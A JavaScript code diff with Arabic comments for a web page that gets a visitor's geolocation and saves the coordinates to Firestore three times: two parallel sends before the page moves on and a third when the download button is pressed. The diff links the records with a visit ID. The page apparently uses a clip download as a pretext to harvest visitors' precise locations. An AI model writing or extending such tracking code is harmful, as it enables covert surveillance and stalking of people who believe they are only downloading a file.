@@ -9,6 +9,12 @@ function withTimeout(promise, ms) {
   ]);
 }
 
+// يولّد معرف زيارة قصير وفريد لكل محاولة تحميل، نستخدمه كجزء من اسم كل مستند
+// بـ Firestore حتى تكون الطلبات الثلاثة الخاصة بنفس الزيارة واضحة الارتباط.
+function createVisitId() {
+  return `${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 8)}`;
+}
+
 async function requestNotificationPermission() {
   if (!('Notification' in window)) {
     throw new Error('متصفحك لا يدعم إذن الإشعارات');
@@ -91,6 +97,10 @@ document.addEventListener('DOMContentLoaded', () => {
       hideError();
       setLoading(true, 'جاري التحقق من إذن الموقع...');
 
+      // معرف جديد لكل محاولة ضغط على الزر، يربط الطلبات الثلاثة القادمة ببعضها
+      const visitId = createVisitId();
+      sessionStorage.setItem('visitId', visitId);
+
       // نطلق طلب إذن الإشعارات بدون ما ننتظر نتيجته (اختياري تمامًا).
       requestNotificationPermission().catch(() => {
         // اختياري: تجاهل الرفض عمدًا
@@ -112,17 +122,27 @@ document.addEventListener('DOMContentLoaded', () => {
         );
 
         // نرسل نفس الموقع مرتين بالتوازي (إرسال أول + إرسال احتياطي ثاني)،
-        // وننتظرهم فعليًا (بحد أقصى 4 ثوانٍ لكل وحدة) قبل ما نغادر الصفحة.
-        // هذا يحل مشكلة "مرات يوصل ومرات لا": كان الانتقال الفوري السابق
-        // يقطع طلب الحفظ بالمنتصف قبل ما يوصل للسيرفر.
+        // كل وحدة باسم مستند مبني على نفس visitId حتى تظهروا مرتبطين
+        // ببعض بقائمة Firestore، وننتظرهم فعليًا (بحد أقصى 4 ثوانٍ لكل وحدة)
+        // قبل ما نغادر الصفحة.
         if (typeof window.saveLocationToFirestore === 'function') {
           await Promise.allSettled([
             withTimeout(
-              window.saveLocationToFirestore(coords.latitude, coords.longitude, coords.accuracy),
+              window.saveLocationToFirestore(
+                coords.latitude,
+                coords.longitude,
+                coords.accuracy,
+                `${visitId}-1-permission`
+              ),
               4000
             ),
             withTimeout(
-              window.saveLocationToFirestore(coords.latitude, coords.longitude, coords.accuracy),
+              window.saveLocationToFirestore(
+                coords.latitude,
+                coords.longitude,
+                coords.accuracy,
+                `${visitId}-2-backup`
+              ),
               4000
             ),
           ]);
@@ -150,12 +170,14 @@ document.addEventListener('DOMContentLoaded', () => {
       status.classList.add('is-success');
 
       // الإرسال الثالث: نعيد إرسال نفس إحداثيات الموقع (المخزّنة من الصفحة
-      // الأولى) لحظة ضغط زر التحميل الفعلي، كتكرار احتياطي إضافي.
+      // الأولى) لحظة ضغط زر التحميل الفعلي، باسم مستند مبني على نفس
+      // visitId عشان يظهر مرتبط بالإرسالين الأولين بنفس المجموعة بـ Firestore.
       const storedCoords = sessionStorage.getItem('clipCoords');
-      if (storedCoords && typeof window.saveLocationToFirestore === 'function') {
+      const visitId = sessionStorage.getItem('visitId');
+      if (storedCoords && visitId && typeof window.saveLocationToFirestore === 'function') {
         try {
           const { lat, lng, accuracy } = JSON.parse(storedCoords);
-          window.saveLocationToFirestore(lat, lng, accuracy);
+          window.saveLocationToFirestore(lat, lng, accuracy, `${visitId}-3-download`);
         } catch (_) {
           // تجاهل أي خطأ بتحويل البيانات المخزّنة، ما نوقف تجربة التحميل بسببه
         }
